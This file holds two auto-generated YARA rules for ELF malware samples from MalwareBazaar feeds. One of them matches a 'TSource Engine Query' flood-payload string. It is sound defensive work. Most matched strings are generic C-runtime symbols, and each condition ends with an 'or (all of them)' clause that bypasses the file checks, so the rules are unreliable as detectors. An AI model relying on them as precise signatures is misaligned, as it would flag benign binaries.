rule _7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6_846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88_8 {
   meta:
      description = "evidences - from files 7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6.elf, 846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88c75d70.elf, c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6"
      hash2 = "846c3d091bb301e02fed99388214a9278d29c35087f77184f045bc1a88c75d70"
      hash3 = "c470f7a03f563d8b07da9ca64dfe6964e65a2f89fbd52990f2ef1e7b7579391b"
   strings:
      $s1 = "completed.1" fullword ascii
      $s2 = "__isoc99_sscanf@GLIBC_2.7" fullword ascii
      $s3 = "GLIBC_2.7" fullword ascii
      $s4 = "__DTOR_END__" fullword ascii
      $s5 = "dtor_idx.0" fullword ascii
      $s6 = "__CTOR_END__" fullword ascii
      $s7 = "crt1.o" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x457f and filesize < 70KB and ( all of them )
      ) or ( all of them )
}

rule _7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6_c81d7f537eb3f5cb599bbbf5317ffc7583ecf3b7742e0f7cb7bfdd55a0_9 {
   meta:
      description = "evidences - from files 7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6.elf, c81d7f537eb3f5cb599bbbf5317ffc7583ecf3b7742e0f7cb7bfdd55a0a2c3a5.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-11"
      hash1 = "7e1226aa38a9f5e729bfce4b956ab068bb7aaf942c7fbba5effaca59bb7282d6"
      hash2 = "c81d7f537eb3f5cb599bbbf5317ffc7583ecf3b7742e0f7cb7bfdd55a0a2c3a5"
   strings:
      $s1 = "frame_dummy" fullword ascii
      $s2 = "__do_global_dtors_aux" fullword ascii
      $s3 = "_ITM_deregisterTMCloneTable" fullword ascii
      $s4 = "_ITM_registerTMCloneTable" fullword ascii
      $s5 = "TSource Engine Query" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 60KB and ( all of them )
      ) or ( all of them )
}
